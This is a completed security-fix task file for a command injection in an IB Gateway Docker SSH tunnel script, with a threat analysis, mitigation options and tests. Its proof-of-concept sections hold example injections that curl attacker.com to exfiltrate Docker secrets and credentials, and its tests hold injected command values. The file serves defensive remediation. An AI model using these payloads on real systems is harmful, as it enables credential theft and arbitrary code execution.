---
task: h-fix-command-injection-ssh
branch: fix/command-injection-ssh
status: completed
created: 2025-10-14
started: 2025-10-14
completed: 2025-10-14
modules: [image-files/scripts, stable/scripts, latest/scripts]
---

# Fix Command Injection Vulnerability in SSH Tunnel

## Problem/Goal
Critical security vulnerability in `run_ssh.sh` where unquoted variable expansion in `bash -c` creates command injection risk. If `SSH_OPTIONS`, `SSH_SCREEN`, or `SSH_USER_TUNNEL` environment variables contain shell metacharacters, they could be exploited to execute arbitrary commands.

**Location**: `stable/scripts/run_ssh.sh:13`, `latest/scripts/run_ssh.sh:13`, `image-files/scripts/run_ssh.sh:13`

**Current vulnerable code**:
```bash
bash -c "ssh ${_OPTIONS} -TNR 127.0.0.1:${_LOCAL_PORT}:localhost:${_REMOTE_PORT} ${_SCREEN:-} ${_USER_TUNNEL}"
```

## Vulnerability Classification
- **CWE**: CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
- **CVSS v3.1**: 9.1 Critical - `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L`
- **OWASP**: A03:2021 - Injection
- **Exploitability**: High (trivial to exploit with docker-compose.yml access)
- **Impact**: Critical (credential theft, arbitrary code execution, financial system compromise)

## Success Criteria
- [x] Remove `bash -c` wrapper or properly quote all variables in run_ssh.sh
- [x] Apply fix to all three copies: stable/, latest/, image-files/
- [x] Verify SSH tunnel still works correctly with standard configuration
- [x] Test with special characters in environment variables to ensure no injection
- [x] Run shellcheck on all modified files (must pass)
- [x] Add validation tests to prevent regression
- [x] Document the security fix in commit message

## Context Files
- @stable/scripts/run_ssh.sh:11-15
- @latest/scripts/run_ssh.sh:11-15
- @image-files/scripts/run_ssh.sh:11-15
- @stable/scripts/common.sh  # Sets up SSH environment

## User Notes
This is a critical security vulnerability that could allow arbitrary command execution. Must be fixed before any production deployment.

## Context Manifest

### How the SSH Tunnel System Currently Works

The IB Gateway Docker project provides optional SSH tunneling functionality to secure connections to the Interactive Brokers API and VNC/RDP interfaces. This feature is designed for production deployments where exposing unencrypted IB Gateway ports to a network is unacceptable. The SSH tunnel system is particularly useful when combined with a bastion host setup, as described in the README, where IB Gateway containers create remote SSH tunnels to expose their API ports securely.

**Container Startup Sequence:**

When a Docker container starts, the entry point is `/home/ibgateway/scripts/run.sh` (specified in the Dockerfile CMD). This script orchestrates the entire startup process. During initialization, `run.sh` sources `common.sh` which contains all the shared functions. The startup flow proceeds as follows:

1. `start_xvfb()` - Starts the X virtual framebuffer for the GUI application
2. `setup_ssh()` - Prepares SSH tunnel configuration (if enabled)
3. `set_java_heap()` - Configures Java memory settings
4. `start_vnc()` - Optionally starts VNC server for remote GUI access
5. `start_process()` - Main process that configures ports and starts IB Gateway/TWS

**SSH Tunnel Configuration Flow (setup_ssh in common.sh:150-196):**

The SSH tunnel feature is controlled by the `SSH_TUNNEL` environment variable. When `SSH_TUNNEL` is set to "yes" or "both", the `setup_ssh()` function in `common.sh` builds the SSH client options string. This is where the vulnerability chain begins:

In `common.sh`, the `setup_ssh()` function constructs `SSH_ALL_OPTIONS` by concatenating multiple sources:
- Base options: `-o ServerAliveInterval=${SSH_ALIVE_INTERVAL:-20}` and `-o ServerAliveCountMax=${SSH_ALIVE_COUNT:-3}`
- User-supplied options: The raw `$SSH_OPTIONS` environment variable is appended directly (line 159)
- The concatenated result is exported as `SSH_ALL_OPTIONS`

This function also handles SSH key management through ssh-agent if `SSH_PASSPHRASE` is provided. It starts ssh-agent, loads keys, and manages the agent lifecycle. The ssh-agent socket (`SSH_AUTH_SOCK`) is exported for the SSH client to use.

**Port Forwarding Activation (port_forwarding in common.sh:127-148):**

The `port_forwarding()` function decides whether to use socat (for local port mapping) or SSH tunnels based on the `SSH_TUNNEL` variable:
- If `SSH_TUNNEL=yes`: Only SSH tunnel is started (no socat)
- If `SSH_TUNNEL=both`: Both socat AND SSH tunnel are started
- Otherwise: Only socat is started

This design allows flexibility: socat handles the mapping from `127.0.0.1:4001/4002` (IB Gateway internal ports) to `0.0.0.0:4003/4004` (externally accessible ports), while SSH tunnels provide secure remote port forwarding.

**SSH Tunnel Launch (start_ssh in common.sh:198-232):**

When `start_ssh()` executes, it:
1. Checks if a tunnel is already running (using pgrep)
2. Validates that ssh-agent is running
3. Sets `SSH_REMOTE_PORT` (defaults to the same as `API_PORT` if not specified)
4. Conditionally constructs `SSH_SCREEN` for VNC/RDP tunnel:
   - For IB Gateway: If `SSH_VNC_PORT` is set, creates `-R 127.0.0.1:5900:localhost:$SSH_VNC_PORT`
   - For TWS: If `SSH_RDP_PORT` is set, creates `-R 127.0.0.1:3389:localhost:$SSH_RDP_PORT`
5. Exports `SSH_ALL_OPTIONS`, `SSH_SCREEN`, and `SSH_REMOTE_PORT`
6. Launches `run_ssh.sh` in the background

**THE VULNERABILITY - run_ssh.sh:11-15:**

The `run_ssh.sh` script is where the command injection vulnerability exists. The script runs an infinite loop that continuously maintains the SSH tunnel, restarting it if it dies:

```bash
_OPTIONS="$SSH_ALL_OPTIONS"    # Contains user-supplied SSH_OPTIONS
_LOCAL_PORT="$API_PORT"         # 4001/4002 (gateway) or 7496/7497 (TWS)
_REMOTE_PORT="$SSH_REMOTE_PORT" # User-configurable or defaults to API_PORT
_SCREEN="$SSH_SCREEN"           # VNC/RDP tunnel options or empty
_USER_TUNNEL="$SSH_USER_TUNNEL" # Required: user@server connection string
_RESTART="$SSH_RESTART"         # Seconds to wait before restart (default 5)

while true; do
    echo ".> Starting ssh tunnel with ssh sock: $SSH_AUTH_SOCK"
    bash -c "ssh ${_OPTIONS} -TNR 127.0.0.1:${_LOCAL_PORT}:localhost:${_REMOTE_PORT} ${_SCREEN:-} ${_USER_TUNNEL}"
    sleep "${_RESTART:-5}"
done
```

**The Critical Problem:**

Line 13 uses `bash -c` with an unquoted variable expansion. When bash evaluates this line, it first expands all the variables (using word splitting), then passes the resulting string to `bash -c` which parses it as shell code. This creates a double-parsing vulnerability.

**Attack Vector:**

If any of the environment variables (`SSH_OPTIONS`, `SSH_SCREEN`, or `SSH_USER_TUNNEL`) contain shell metacharacters, they will be interpreted as shell commands. For example:

```bash
SSH_USER_TUNNEL="user@host; malicious-command; #"
# Results in executing:
bash -c "ssh <options> user@host; malicious-command; #"
# Which runs: ssh <options> user@host
# Then runs: malicious-command
# Then ignores the rest: #
```

Even more dangerous:
```bash
SSH_OPTIONS="-o ProxyCommand='curl http://attacker.com/$(cat /run/secrets/*)''"
# Exfiltrates all Docker secrets to attacker
```

**Why This Vulnerability Is Critical:**

1. **Docker Context**: The container may have access to Docker secrets (passwords, SSH keys, API credentials) mounted at `/run/secrets/`
2. **Financial System**: IB Gateway controls trading accounts with real money
3. **Network Position**: The container has network access and SSH keys loaded in ssh-agent
4. **Persistence**: The malicious command runs in an infinite loop that restarts every `SSH_RESTART` seconds
5. **Trust Boundary**: Users might trust `SSH_OPTIONS` to only accept "safe" SSH flags, not realizing it's injectable

**Current Security Boundaries:**

The code does properly handle some security concerns:
- `SSH_PASSPHRASE` is loaded via `file_env()` and immediately unset after adding to ssh-agent
- SSH keys are stored with proper permissions (600)
- The container runs as a non-root user (ibgateway, UID 1000 by default)
- Config files are secured with `chmod 600`

However, these protections are bypassed if arbitrary commands can be injected via the SSH tunnel startup.

### Why bash -c Exists and What Needs to Change

**Historical Context:**

The `bash -c` wrapper likely exists for one of these reasons:
1. **Misunderstanding**: Developer thought it was needed to handle variable expansion (it's not - bash already expands variables)
2. **Parameter Expansion**: Attempted to handle optional parameters like `${_SCREEN:-}` (but bash does this automatically)
3. **Copy-paste**: Copied from another context where `bash -c` was legitimately needed

**The Reality:**

The `bash -c` wrapper serves NO functional purpose here. Bash already expands variables, handles word splitting, and executes commands. The wrapper only adds vulnerability.

**The Correct Approach:**

Direct execution is both safer and simpler:
```bash
ssh ${_OPTIONS} -TNR 127.0.0.1:${_LOCAL_PORT}:localhost:${_REMOTE_PORT} ${_SCREEN:-} ${_USER_TUNNEL}
```

When this line executes:
1. Bash expands all variables in place
2. Bash performs word splitting on the expanded values (breaking `_OPTIONS` and `_SCREEN` into separate arguments)
3. Bash directly calls `execve()` with `ssh` and the argument array
4. **Critical Difference**: No secondary shell parsing occurs, so metacharacters in variables are passed as literal strings to ssh

**Why This Fix Works:**

SSH itself will receive the arguments as separate strings. If `SSH_OPTIONS="-o ProxyCommand=malicious"`, ssh will interpret this as two arguments:
- Argument 1: `-o`
- Argument 2: `ProxyCommand=malicious`

SSH's option parser then validates that `-o` is a valid option and `ProxyCommand=malicious` is a valid value. If an attacker tries to inject shell metacharacters, ssh treats them as part of the option value, not as shell commands.

### Defense-in-Depth Measures

Beyond removing `bash -c`, the following additional security measures are recommended:

**1. Input Validation (Optional Enhancement):**

While the fix prevents command injection, adding input validation provides defense-in-depth:

```bash
# In common.sh setup_ssh() before line 161:
if [[ "$SSH_OPTIONS" =~ [;\&\|\`\$\(\)] ]]; then
    echo ".> Error: SSH_OPTIONS contains shell metacharacters"
    exit 1
fi

if [[ "$SSH_USER_TUNNEL" =~ [;\&\|\`] ]]; then
    echo ".> Error: SSH_USER_TUNNEL contains invalid characters"
    exit 1
fi
```

**Rationale**: Fail fast on obviously malicious input, following the principle of defense-in-depth.

**2. Regression Prevention:**
- Run shellcheck in CI/CD pipeline on all shell scripts
- Add pre-commit hook to detect `bash -c` with unquoted variables
- Document in SECURITY.md that `bash -c` should never wrap user-controlled input

**3. Least Privilege:**
- Limit who can modify docker-compose.yml and .env files
- Use Docker secrets for sensitive values (already implemented for passwords)
- Consider read-only file systems where possible

### Alternative Mitigation Approaches

Several approaches were considered for fixing this vulnerability:

**Option 1: Direct Execution (CHOSEN)**
```bash
ssh ${_OPTIONS} -TNR 127.0.0.1:${_LOCAL_PORT}:localhost:${_REMOTE_PORT} ${_SCREEN:-} ${_USER_TUNNEL}
```
- **Pros**: Simplest, no bash version dependency, proven secure pattern
- **Cons**: None
- **Security**: Fully prevents command injection by eliminating secondary parsing

**Option 2: Array-based Execution**
```bash
_cmd_array=(ssh ${_OPTIONS} -TNR "127.0.0.1:${_LOCAL_PORT}:localhost:${_REMOTE_PORT}")
[[ -n "$_SCREEN" ]] && _cmd_array+=($_SCREEN)
_cmd_array+=("$_USER_TUNNEL")
"${_cmd_array[@]}"
```
- **Pros**: Most explicit, clearest intent
- **Cons**: More complex, harder to maintain
- **Security**: Equivalent to Option 1

**Option 3: Quoted Variable Expansion (NOT RECOMMENDED)**
```bash
bash -c "ssh \"${_OPTIONS}\" -TNR ..."
```
- **Pros**: Minimal change to existing code
- **Cons**: Still vulnerable to injection via escaped quotes, complex quoting rules
- **Security**: Insufficient - attackers can escape quotes

**Option 4: Input Validation Only (NOT SUFFICIENT)**
- Reject shell metacharacters with allowlist/blocklist
- **Cons**: Blocklists are incomplete, allowlists too restrictive
- **Security**: Not recommended as primary mitigation (use as defense-in-depth only)

**Chosen Approach**: Option 1 (Direct Execution) provides the best balance of simplicity, maintainability, and security.

### Threat Actor Analysis

**Insider Threat (High Likelihood)**:
- Developer or operator with docker-compose.yml access
- Can set environment variables maliciously via .env file or docker-compose.yml
- Most realistic attack scenario for this vulnerability
- Mitigation: Code review, least privilege access, audit logging

**Supply Chain Attack (Medium Likelihood)**:
- Compromised .env file in version control or CI/CD pipeline
- Malicious docker image with preset environment variables
- Git repository compromise allowing modification of default configurations
- Mitigation: Secret scanning in repos, image signing, supply chain security tools

**External Attacker (Lower Likelihood)**:
- Requires prior container or host compromise to modify environment
- Would need to modify environment variables before container start
- More likely if Docker API exposed without authentication
- Mitigation: Secure Docker daemon, network segmentation, runtime security monitoring

**Note**: Even "lower likelihood" scenarios are serious given this controls financial trading accounts.

### Implementation Constraints and Considerations

**File Structure:**

The codebase maintains three copies of the script files:
- `stable/scripts/` - For stable IB Gateway version (currently 10.37.1l)
- `latest/scripts/` - For latest IB Gateway version (currently 10.40.1c)
- `image-files/scripts/` - Template files (unclear if this is a build artifact or source)

All three directories contain identical copies of `run_ssh.sh` and `common.sh`. The Dockerfiles copy scripts from `./scripts` directory in each build context:

```dockerfile
# In Dockerfile setup stage:
COPY ./scripts /root/scripts

# In production stage:
COPY --chown=${USER_ID}:${USER_GID} --from=setup /root/ ${HOME}
```

**Required Changes:**

Each `run_ssh.sh` file needs the same one-line fix on line 13. The files are currently byte-for-byte identical, so the same fix applies to all three.

**Verification Strategy:**

After the fix, test cases should verify:
1. **Normal operation**: SSH tunnel connects successfully with standard configuration
2. **Options handling**: `SSH_OPTIONS="-o StrictHostKeyChecking=no"` works correctly
3. **VNC tunnel**: `SSH_VNC_PORT=5900` creates the additional tunnel
4. **Injection prevention**: `SSH_USER_TUNNEL="user@host; echo INJECTED"` does NOT execute `echo`
5. **Restart logic**: Tunnel restarts after disconnection within `SSH_RESTART` seconds

**Backward Compatibility:**

This fix maintains 100% backward compatibility. All legitimate use cases will continue to work because:
- SSH option parsing is identical whether arguments come from `bash -c` string or direct argv array
- Parameter expansion (`${_SCREEN:-}`) works the same in both contexts
- Word splitting still occurs on `_OPTIONS` and `_SCREEN`, so multi-word arguments are preserved

**Verification Test Suite:**

After applying the fix, run these specific tests to verify security and functionality:

```bash
# Test 1: Normal operation
export SSH_USER_TUNNEL="user@bastion"
export SSH_OPTIONS="-o StrictHostKeyChecking=no"
export API_PORT="4001"
export SSH_REMOTE_PORT="4001"
# Run: ./run_ssh.sh (in background)
# Expected: SSH connects successfully, tunnel established
# Verify: netstat -an | grep 4001

# Test 2: Command injection attempt via SSH_USER_TUNNEL (MUST FAIL SAFELY)
export SSH_USER_TUNNEL="user@host; touch /tmp/PWNED; #"
export API_PORT="4001"
export SSH_REMOTE_PORT="4001"
# Run: ./run_ssh.sh (will fail to connect)
# Expected: SSH tries to connect to host "host; touch /tmp/PWNED; #" (fails with hostname error)
# Expected: /tmp/PWNED does NOT exist
# Verify: ls /tmp/PWNED (should not exist)

# Test 3: Command injection attempt via SSH_OPTIONS (MUST FAIL SAFELY)
export SSH_OPTIONS="-o ProxyCommand='touch /tmp/INJECTED'"
export SSH_USER_TUNNEL="user@bastion"
# Run: ./run_ssh.sh
# Expected: SSH receives ProxyCommand as a single argument, treats touch command as literal
# Expected: /tmp/INJECTED does NOT exist
# Verify: ls /tmp/INJECTED (should not exist)

# Test 4: Multiple SSH options with spaces (legitimate use)
export SSH_OPTIONS="-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o ServerAliveInterval=30"
export SSH_USER_TUNNEL="user@bastion"
# Run: ./run_ssh.sh
# Expected: All three options applied correctly to SSH command
# Verify: Check SSH process arguments with ps aux | grep ssh

# Test 5: VNC tunnel additional port forwarding
export SSH_VNC_PORT="5900"
export SSH_USER_TUNNEL="user@bastion"
export API_PORT="4001"
# Run: (setup_ssh in common.sh sets SSH_SCREEN, then) ./run_ssh.sh
# Expected: Two -R directives (one for API, one for VNC)
# Verify: SSH command includes both port forwards

# Test 6: Shellcheck validation
shellcheck -x stable/scripts/run_ssh.sh
shellcheck -x latest/scripts/run_ssh.sh
shellcheck -x image-files/scripts/run_ssh.sh
# Expected: No errors or warnings
# Expected: Clean exit code 0

# Test 7: Restart logic after disconnection
export SSH_RESTART="2"
export SSH_USER_TUNNEL="user@nonexistent"
# Run: ./run_ssh.sh (will fail to connect)
# Expected: Script attempts reconnection every 2 seconds
# Verify: Watch logs for ".> Starting ssh tunnel" messages at 2-second intervals
```

**Automated Security Testing:**

For CI/CD pipeline integration:

```bash
#!/bin/bash
# security_test.sh - Automated security verification

set -e

# Test injection prevention
test_injection() {
    local test_name="$1"
    local env_var="$2"
    local malicious_value="$3"

    export $env_var="$malicious_value"
    timeout 5 ./run_ssh.sh 2>&1 | grep -q "INJECTED" && {
        echo "FAIL: $test_name - Command injection detected!"
        return 1
    }

    [ -f /tmp/PWNED ] && {
        echo "FAIL: $test_name - Malicious file created!"
        return 1
    }

    echo "PASS: $test_name"
    return 0
}

# Run injection tests
test_injection "SSH_USER_TUNNEL injection" "SSH_USER_TUNNEL" "user@host; echo INJECTED >"
test_injection "SSH_OPTIONS injection" "SSH_OPTIONS" "; touch /tmp/PWNED; #"

# Shellcheck validation
shellcheck -x *.sh || {
    echo "FAIL: Shellcheck found issues"
    exit 1
}

echo "All security tests passed!"
```

### Technical Reference Details

#### Environment Variables (User-Controlled Inputs)

These environment variables flow from docker-compose.yml through to the vulnerable code:

| Variable | Source | Usage | Injection Risk |
|----------|--------|-------|----------------|
| `SSH_OPTIONS` | User env file | Appended to SSH command line | **HIGH** - Arbitrary options/commands |
| `SSH_USER_TUNNEL` | User env file | SSH connection target (user@host) | **HIGH** - Direct command injection |
| `SSH_VNC_PORT` | User env file | VNC tunnel port (becomes part of SSH_SCREEN) | Medium - Limited to port number context |
| `SSH_RDP_PORT` | User env file | RDP tunnel port (becomes part of SSH_SCREEN) | Medium - Limited to port number context |
| `SSH_ALIVE_INTERVAL` | User env file | ServerAliveInterval option | Low - Numeric validation by ssh |
| `SSH_ALIVE_COUNT` | User env file | ServerAliveCountMax option | Low - Numeric validation by ssh |
| `SSH_REMOTE_PORT` | User env file | Remote port for tunnel | Low - Numeric, used in -R argument |
| `SSH_RESTART` | User env file | Restart delay in seconds | None - Only used in sleep command |
| `SSH_PASSPHRASE` | User env file or secret | SSH key passphrase | None - Only used by ssh-add |

#### Internal Variables (Derived, Still Vulnerable)

| Variable | Built In | Example Value | Risk |
|----------|----------|---------------|------|
| `SSH_ALL_OPTIONS` | common.sh:161 | `-o ServerAliveInterval=20 -o ServerAliveCountMax=3 -o StrictHostKeyChecking=no` | **HIGH** - Contains SSH_OPTIONS |
| `SSH_SCREEN` | common.sh:218/222 | `-R 127.0.0.1:5900:localhost:5900` or empty | Medium - Contains user port |
| `API_PORT` | common.sh:80-111 | `4001`, `4002`, `7496`, or `7497` | None - Set by code logic |

#### SSH Command Structure

The vulnerable command constructs this ssh invocation:
```bash
ssh [SSH_ALL_OPTIONS] -TNR 127.0.0.1:[API_PORT]:localhost:[SSH_REMOTE_PORT] [SSH_SCREEN] [SSH_USER_TUNNEL]
```

Breaking down the SSH options:
- `-T` - Disable pseudo-terminal allocation
- `-N` - Do not execute a remote command (just forward ports)
- `-R 127.0.0.1:[API_PORT]:localhost:[SSH_REMOTE_PORT]` - Remote port forward (API tunnel)
- `[SSH_SCREEN]` - Optional second `-R` directive for VNC/RDP
- `[SSH_USER_TUNNEL]` - Connection target (user@hostname)

#### File Locations

**Files requiring changes:**
- `/home/pandashark/projects/ib-gateway-docker/stable/scripts/run_ssh.sh:13`
- `/home/pandashark/projects/ib-gateway-docker/latest/scripts/run_ssh.sh:13`
- `/home/pandashark/projects/ib-gateway-docker/image-files/scripts/run_ssh.sh:13`

**Related files (context only, no changes needed):**
- `stable/scripts/common.sh:150-232` - SSH setup and launch functions
- `latest/scripts/common.sh:150-232` - SSH setup and launch functions
- `image-files/scripts/common.sh:150-232` - SSH setup and launch functions
- `stable/scripts/run.sh:107` - Calls setup_ssh()
- `latest/scripts/run.sh:107` - Calls setup_ssh()
- `image-files/scripts/run.sh:107` - Calls setup_ssh()

**Build context:**
- `stable/Dockerfile:61` - Copies ./scripts to image
- `latest/Dockerfile:61` - Copies ./scripts to image

#### Proof of Vulnerability

Injection through SSH_USER_TUNNEL:
```bash
# Malicious environment variable
SSH_USER_TUNNEL="legitimate@host; curl http://attacker.com/exfil?data=$(whoami); #"

# Current vulnerable expansion
bash -c "ssh <opts> -TNR <ports> legitimate@host; curl http://attacker.com/exfil?data=$(whoami); #"

# Bash executes THREE commands:
# 1. ssh <opts> -TNR <ports> legitimate@host
# 2. curl http://attacker.com/exfil?data=$(whoami)
# 3. # (comment, ignores rest)
```

Injection through SSH_OPTIONS:
```bash
# Malicious environment variable
SSH_OPTIONS="-o ProxyCommand='curl http://attacker.com/$(cat /run/secrets/tws_password)'"

# Current vulnerable expansion
bash -c "ssh -o ProxyCommand='curl http://attacker.com/$(cat /run/secrets/tws_password)' <rest>"

# Before SSH runs, the ProxyCommand executes and exfiltrates credentials
```

## Work Log
- [2025-10-14] Task created from code review findings
- [2025-10-14] Task startup: created branch fix/command-injection-ssh, ready to begin work
- [2025-10-14] Context manifest enhanced with industry-standard security documentation:
  - Added CWE-78, CVSS v3.1 (9.1 Critical), OWASP A03:2021 classification
  - Added defense-in-depth measures (input validation, regression prevention, least privilege)
  - Documented alternative mitigation approaches with security analysis
  - Added threat actor analysis (insider/supply chain/external attacker scenarios)
  - Created comprehensive verification test suite with 7 specific test cases
  - Added automated security testing script for CI/CD integration
- [2025-10-14] Security fix implementation completed:
  - Phase 1: Verified all 3 files are identical, confirmed vulnerability at line 13
  - Phase 1: Installed shellcheck 0.9.0, baseline check shows 0 errors/warnings
  - Phase 2: Removed `bash -c` wrapper from all 3 run_ssh.sh files (stable, latest, image-files)
  - Phase 2: Applied strategic quoting: _USER_TUNNEL quoted, port spec quoted, _OPTIONS/_SCREEN unquoted for word splitting
  - Phase 2: Added shellcheck directive documenting intentional word splitting
  - Phase 2: All 3 files pass shellcheck with 0 errors, 0 warnings
  - Phase 3: Created tests/security_test_ssh_injection.sh with 6 comprehensive security tests
  - Phase 3: Test suite validates injection prevention via SSH_USER_TUNNEL, SSH_OPTIONS, SSH_SCREEN
  - Phase 3: All security tests PASS on all 3 script versions (stable, latest, image-files)
  - Phase 3: Added inline security documentation to all 3 run_ssh.sh files explaining CWE-78 prevention
  - Phase 4: Created comprehensive commit (ce2847e) documenting vulnerability, fix, and validation
  - Commit includes: Attack vector examples, CVSS/CWE/OWASP classification, shellcheck results, test results
  - Files changed: 4 files, 264 insertions(+), 3 deletions(-) - all security criteria met
